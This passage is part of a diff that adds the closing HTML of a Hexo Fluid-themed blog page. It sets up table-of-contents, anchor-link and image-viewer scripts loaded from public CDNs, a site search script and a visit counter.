+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
